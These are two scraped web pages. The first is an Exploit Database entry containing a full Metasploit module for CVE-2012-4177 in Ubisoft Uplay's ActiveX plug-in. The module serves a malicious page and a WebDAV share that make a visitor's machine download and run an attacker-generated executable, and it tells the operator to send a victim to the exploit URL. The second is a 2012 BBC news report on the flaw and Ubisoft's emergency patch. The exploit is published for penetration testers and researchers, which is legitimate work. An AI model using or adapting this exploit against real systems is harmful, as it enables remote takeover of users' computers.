=== Content from www.exploit-db.com_f3d63d37_20250124_231818.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Ubisoft uplay 2.0.3 - ActiveX Control Arbitrary Code Execution (Metasploit)

#### EDB-ID:

###### 20321

#### CVE:

###### [2012-4177](https://nvd.nist.gov/vuln/detail/CVE-2012-4177)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2012-08-08

---

**Vulnerable App:**

```
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ubisoft uplay 2.0.3 Active X Control Arbitrary Code Execution',
			'Description'    => %q{
				The uplay ActiveX component allows an attacker to execute any command line action.
				User must sign in, unless auto-sign in is enabled and uplay must not already be
				running.  Due to the way the malicious executable is served (WebDAV), the module
				must be run on port 80, so please make sure you have enough privilege to do that.
				Ubisoft released patch 2.04 as of Mon 20th July.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Initial discovery
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
					'phillips321 <phillips321[at]phillips321.co.uk>',
					'Richard Hicks <scriptmonkeyblog[at]gmail.com>'
				],
			'References'     =>
				[
					[ 'OSVDB', '84402'],
					[ 'URL', 'http://seclists.org/fulldisclosure/2012/Jul/375']
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 29 2012'))

		register_options(
		[
			OptPort.new('SRVPORT', [true, "The daemon port to listen on (do not change)", 80]),
			OptString.new('URIPATH', [true, "The URI to use (do not change).", "/"]),
			OptString.new('EXPLOITPATH', [false, "The URI to use for the exploit"])
		], self.class)

		# WebDAV does not support SSL and must run over port 80.
		deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT' 'URIPATH')
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def is_exploitable?(req)
		# Only engage Win XP SP3 targets
		req.headers['User-Agent'] =~ /NT 5\.1/
	end

	def on_request_uri(cli, request)
		case request.method
		when 'OPTIONS'
			process_options(cli, request)
		when 'PROPFIND'
			process_propfind(cli, request)
		when 'GET'
			if request.uri_parts['Resource'].include? @uplay_uri
				if is_exploitable?(request)
					prompt_uplay(cli, request)
				else
					print_error("Not the target we want, will not engage.")
					resp = create_response(404, "Not Found")
					resp.body = ""
					resp['Content-Type'] = 'text/html'
					cli.send_response(resp)
				end
			else
				process_get(cli, request)
			end
		else
			vprint_status("#{request.method} => 404 (#{request.uri})")
			resp = create_response(404, "Not Found")
			resp.body = ""
			resp['Content-Type'] = 'text/html'
			cli.send_response(resp)
		end
	end

	def prompt_uplay(cli, request)
		url =  "http://"
		url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		url += ":" + datastore['SRVPORT'].to_s + get_resource() + "/"

		path = "#{@exploit_unc}#{@share_name}\\#{@basename}.exe"

		if path.length > 693
			fail_with(Exploit::Failure::Unknown,"Remote path is too long must be < 694 characters")
			return
		end

		cmd = Rex::Text.encode_base64(path)

		classid = "clsid:1c492e6a-2803-5ed7-83e1-1b1d4d41eb39"
		type = "application/x-uplaypc" # Unused but alternative to classid
		content = %Q|<html>
<body>
<script>
x = document.createElement('OBJECT');
x.classid='#{classid}';
document.body.appendChild(x);
x.open('-orbit_product_id 1 -orbit_exe_path #{cmd} -uplay_steam_mode -uplay_dev_mode -uplay_dev_mode_auto_play');
</script>
</body>
</html>|

		print_status("GET => Exploit")
		send_response_html(cli, content)
		handler(cli)
	end

	def process_get(cli, request)
		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		webdav = "\\\\#{myhost}\\"

		if blacklisted_path?(request.uri)
			vprint_status("GET => 404 [BLACKLIST] (#{request.uri})")
			resp = create_response(404, "Not Found")
			resp.body = ""
			cli.send_response(resp)
			return
		end

		if (request.uri.include? @basename)
			print_status("GET => Payload")
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		# Treat index.html specially
		if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
			vprint_status("GET => REDIRECT (#{request.uri})")
			resp = create_response(200, "OK")

			resp.body = %Q|<html><head><meta http-equiv="refresh" content="0;URL=#{@exploit_unc}#{@share_name}\\"></head><body></body></html>|

			resp['Content-Type'] = 'text/html'
			cli.send_response(resp)
			return
		end

		# Anything else is probably a request for a data file...
		vprint_status("GET => DATA (#{request.uri})")
		data = "HELLO!"
		send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		vprint_status("OPTIONS #{request.uri}")
		headers = {
			'MS-Author-Via' => 'DAV',
			'DASL'          => '<DAV:sql>',
			'DAV'           => '1, 2',
			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
			'Cache-Control' => 'private'
		}
		resp = create_response(207, "Multi-Status")
		headers.each_pair {|k,v| resp[k] = v }
		resp.body = ""
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end

	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		vprint_status("PROPFIND #{path}")
		body = ''

		my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		my_uri    = "http://#{my_host}/"

		if path !~ /\/$/

			if blacklisted_path?(path)
				vprint_status "PROPFIND => 404 (#{path})"
				resp = create_response(404, "Not Found")
				resp.body = ""
				cli.send_response(resp)
				return
			end

			if path.index(".")
				vprint_status "PROPFIND => 207 File (#{path})"
				body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
				# send the response
				resp = create_response(207, "Multi-Status")
				resp.body = body
				resp['Content-Type'] = 'text/xml; charset="utf8"'
				cli.send_response(resp)
				return
			else
				vprint_status "PROPFIND => 301 (#{path})"
				resp = create_response(301, "Moved")
				resp["Location"] = path + "/"
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			end
		end

		vprint_status "PROPFIND => 207 Directory (#{path})"
		body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
	<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
		<D:href>#{path}</D:href>
		<D:propstat>
			<D:prop>
				<lp1:resourcetype><D:collection/></lp1:resourcetype>
				<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
				<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
				<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
				<D:supportedlock>
					<D:lockentry>
						<D:lockscope><D:exclusive/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
					<D:lockentry>
						<D:lockscope><D:shared/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
				</D:supportedlock>
				<D:lockdiscovery/>
				<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
			</D:prop>
		<D:status>HTTP/1.1 200 OK</D:status>
	</D:propstat>
</D:response>
|

		if request["Depth"].to_i > 0
			trail = path.split("/")
			trail.shift
			case trail.length
			when 0
				body << generate_shares(path)
			when 1
				body << generate_files(path)
			end
		else
			vprint_status "PROPFIND => 207 Top-Level Directory"
		end

		body << "</D:multistatus>"

		body.gsub!(/\t/, '')

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml; charset="utf8"'
		cli.send_response(resp)
	end

	def generate_shares(path)
		share_name = @share_name
%Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
	end

	def generate_files(path)
		trail = path.split("/")
		return "" if trail.length < 2

		base  = @basename
		exts  = @extensions.gsub(",", " ").split(/\s+/)
		files = ""
		exts.each do |ext|
			files << %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{base}.#{ext}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
<D:ishidden b:dt="boolean">1</D:ishidden>
</D:propstat>
</D:response>
|
		end

		files
	end

	def gen_timestamp(ttype=nil)
		::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
	end

	def gen_datestamp(ttype=nil)
		::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
	end

	# This method rejects requests that are known to break exploitation
	def blacklisted_path?(uri)
		share_path = "/#{@share_name}"
		payload_path = "#{share_path}/#{@basename}.exe"
		case uri
		when payload_path
			return false
		when share_path
			return false
		else
			return true
		end
	end

	def exploit
		@basename = rand_text_alpha(8)
		@share_name = rand_text_alpha(8)
		@extensions = "exe"

		if datastore['EXPLOITPATH']
			@uplay_uri = datastore['EXPLOITPATH']
		else
			@uplay_uri = rand_text_alpha(8)
		end

		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']

		@exploit_unc  = "\\\\#{myhost}\\"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			fail_with(Exploit::Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
		end

		vprint_status("Payload available at #{@exploit_unc}#{@share_name}\\#{@basename}.exe")
		print_good("Please let your victim browse to this exploit URI: http://#{myhost}:#{datastore['SRVPORT']}/#{@uplay_uri}")

		super
	end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.bbc.com_92c4b626_20250124_231817.html ===
[BBC Homepage](https://www.bbc.com)

* [Skip to content](#main-heading)
* [Accessibility Help](https://www.bbc.co.uk/accessibility/)

* [Your account](https://account.bbc.com/account?lang=en-GB&ptrt=https%3A%2F%2Fwww.bbc.com%2Fnews%2Ftechnology-19053453)

* [Home](https://www.bbc.com)
* [News](https://www.bbc.com/news)
* [Sport](https://www.bbc.com/sport)
* [Business](https://www.bbc.com/business)
* [Innovation](https://www.bbc.com/innovation)
* [Culture](https://www.bbc.com/culture)
* [Travel](https://www.bbc.com/travel)
* [Earth](https://www.bbc.com/future-planet)
* [Video](https://www.bbc.com/video)
* [Live](https://www.bbc.com/live)
* [More menu](#global-navigation-more-menu)
[More menu](#global-navigation-more-menu)[Search BBC](https://www.bbc.co.uk/search?d=NEWS_GNL)

* [Home](https://www.bbc.com)
* [News](https://www.bbc.com/news)
* [Sport](https://www.bbc.com/sport)
* [Business](https://www.bbc.com/business)
* [Innovation](https://www.bbc.com/innovation)
* [Culture](https://www.bbc.com/culture)
* [Travel](https://www.bbc.com/travel)
* [Earth](https://www.bbc.com/future-planet)
* [Video](https://www.bbc.com/video)
* [Live](https://www.bbc.com/live)

[Close menu](#more-menu-button)[BBC News](/news)[Menu](#product-navigation-menu)

* [Home](/news)
* [Israel-Gaza war](/news/topics/c2vdnvdg6xxt)
* [War in Ukraine](/news/world-60525350)
* [Climate](/news/topics/cmj34zmwm1zt)
* [Video](/news/av/10462520)
* [World](/news/world)
* [UK](/news/uk)
* [Business](/news/business)
* [Tech](/news/technology)
* [Science](/news/science_and_environment)
[More](#product-navigation-more-menu)

* [Entertainment & Arts](/news/entertainment_and_arts)
* [Health](/news/health)
* [World News TV](/news/world_radio_and_tv)
* [In Pictures](/news/in_pictures)
* [BBC Verify](/news/reality_check)
* [Newsbeat](/news/newsbeat)

* [Tech](/news/technology)
# Ubisoft rush to fix security hole exposed by plug-in

* Published30 July 2012
Shareclose panelShare pageCopy link[About sharing](https://www.bbc.co.uk/usingthebbc/terms/can-i-share-things-from-the-bbc)![Art from Assassin's Creed](https://ichef.bbci.co.uk/ace/standard/304/mcs/media/images/61913000/jpg/_61913378_61912386.jpg)

Image caption,

Games affected include the massively popular Assassin's Creed series

**Games maker Ubisoft has been forced to release an emergency patch to fix a security hole discovered in its Uplay application.**

A web browser add-on reportedly left users open to outside attackers gaining control of their computer.

The Uplay software is bundled with major titles like Assassin's Creed.

"We recommend that all Uplay users update their Uplay PC application without a Web browser open," Ubisoft said.

"This will allow the plug-in to update correctly.

"An updated version of the Uplay PC installer with the patch also is available from Uplay.com."

Uplay is a system that allows gamers to earn points and rewards for performance which are logged online.

As well as the multi-million-selling Assassin's Creed series, Uplay is also used with games such as Call of Juarez: San Francisco, Just Dance 3 and several titles in the Tom Clancy series.

## Vacation discovery

The spokesman added: "Ubisoft takes security issues very seriously, and we will continue to monitor all reports of vulnerabilities within our software and take swift action to resolve such issues."

The flaw was discovered by Tavis Ormandy, a Google employee.

On a mailing list for information security experts and hobbyists, he wrote: "While on vacation recently I bought a video game called Assassin's Creed Revelations. I didn't have much of a chance to play it, but it seems fun so far.

"However, I noticed the installation procedure creates a browser plug-in for it's accompanying Uplay launcher, which grants unexpectedly (at least to me) wide access to websites."

It was discovered that any website could force users with the plug-in to open any program on their PC.

To demonstrate this, one security researcher created a website proving the exploits' existence. When a person visited the website, the calculator program would launch.

While the calculator is harmless, experts warned that the technique could be used to launch a potentially malicious program.

## Top stories

* [One dead and nearly a million without power in Storm Ãowyn](/news/articles/c78x4503neyo)
  + Published2 hours ago
* [Watch: Trees down and streets flooded as Storm Ãowyn brings wild weather](/news/videos/crlk02xyp87o)
  + Published9 hours ago
* [Live.Â

  Trump criticises wildfires response ahead of Los Angeles visit](/news/live/ce8y3yk00yjt)
## More to explore

* [Harry v the tabloids. What next, if anything?](/news/articles/c07kdj8181jo)![Prince Harry, dressed in a blue suit and grey tie, gives a thumbs up to supporters as he leaves the High Court's Rolls Building in 2023, with media cameras in the background, during his evidence against the Mirror Group titles who he was suing at the time for unlawful intrusion. ](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/dd6a/live/2bed1ad0-da76-11ef-bd96-095eab67c5b7.jpg)
* [Even before the LA fires, Californians fled for 'climate havens'](/news/articles/c4g334eppm7o)![Christina Welch wears a green sweater while standing near the water in Deluth](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/610c/live/f42e90f0-d9c2-11ef-a37f-eba91255dc3d.jpg)
* [Lola Young's Messy hits number one: My songs are as real as it gets](/news/articles/ceq9ge90y1lo)![Lola Young performing on stage with a finger raised, in front of a red and white backdrop](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/06e9/live/50428720-da54-11ef-a37f-eba91255dc3d.jpg)
* [Would you make a good Traitor? Take our quiz](/news/articles/c0rqvp0zdl0o)![Claudia Winkleman dressed in a black cloak outside with fire on large lamps burning behind her. ](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/ae2d/live/40f0c050-da60-11ef-8fcc-ebcdda6954b0.jpg)
* [A decade in the making, Central Cee says you Can't Rush Greatness](/news/articles/cy8xn8l232lo)![Central Cee  pictured at the GQ awards in 2024. He wears a denim jacket and sunglasses, the tattoo 'family' above his right eye visible in the side-profile shot. He's pictured against a red backdrop. ](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/2b37/live/32f5aff0-d9a8-11ef-98f3-8f799a2ac21a.jpg)
* [Russia suffering 'environmental catastrophe' after oil spill in Kerch Strait](/news/articles/c23ngk5vgmpo)![Volunteers work to clean up spilled oil on the shoreline following an incident involving two tankers damaged in a storm in the Kerch Strait. The men are wearing camouflage uniforms. One holds a shovel and is putting oil into a bag, which the other man holds. In the background the sea is seen. ](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/f6b6/live/efc0b7e0-d9b4-11ef-abf7-8b2a99c77ef2.jpg)
* [Could calling attacks like Southport 'terrorism' help to prevent them?](/news/articles/c62enpv2870o)![Mugshot of Axel Rudakubana (left) and police officers at the scene of the crime (right)](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/77c5/live/802528e0-d9bd-11ef-902e-cf9b84dc1357.png)
* [Weekly Quiz: Which film came out top in the Oscar nominations?](/news/articles/c627vy28nndo)![Actress Selena Gomez smiles on the red carpet at the Cannes Film Festival. She wears a white dress with exposed shoulders, with a diamond necklace and earrings. Her long dark hair is held back with a hairband.](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/0304/live/a998cb20-d9ac-11ef-a37f-eba91255dc3d.jpg)
* [The Brutalist honours my family's hardships and loss, says actor Adrien Brody](/news/articles/cm21jyqn6y7o)![A headshot portrait of Adrien Brody taken at a photocall for The Brutalist. He is wearing a dark turtleneck jumper and navy blue jacket.](https://ichef.bbci.co.uk/ace/standard/385/cpsprodpb/262b/live/e042e220-da3b-11ef-a37f-eba91255dc3d.jpg)
## Elsewhere on the BBC

* [Could AI solve a murder case?](/sounds/play/m0026nct?at_mid=fsnCy35IfK&at_campaign=The_Artificial_Human_Can_AI_Solve_A_Murder&at_medium=display_ad&at_campaign_type=owned&at_audience_id=SS&at_product=sounds&at_brand=m001wjf8&at_ptr_name=bbc&at_ptr_type=media&at_format=image&at_objective=consumption&at_link_title=The_Artificial_Human_Can_AI_Solve_A_Murder&at_bbc_team=BBC)

  Examining the possibility that AI data processing could lead to new forms of evidence

  ![The Artificial Human](https://ichef.bbci.co.uk/ace/standard/480/cpsprodpb/5511/live/8b3c6110-d681-11ef-87df-d575b9a434a4.jpg)
* [Can't get enough of The Traitors?](/iplayer/episode/m001w2cx?at_mid=ps59fy8Xzt&at_campaign=The_Traitors_Australia&at_medium=display_ad&at_campaign_type=owned&at_audience_id=SS&at_product=iplayer&at_brand=p0fwwylv&at_ptr_name=bbc&at_ptr_type=media&at_format=image&at_objective=consumption&at_link_title=The_Traitors_Australia&at_bbc_team=BBC)

  Get your Traitors fix with the Aussie take on the ultimate âmind gameâ

  ![The Traitors Australia ](https://ichef.bbci.co.uk/ace/standard/480/cpsprodpb/76a4/live/aaf42a70-da72-11ef-bc01-8f2c83dad217.jpg)
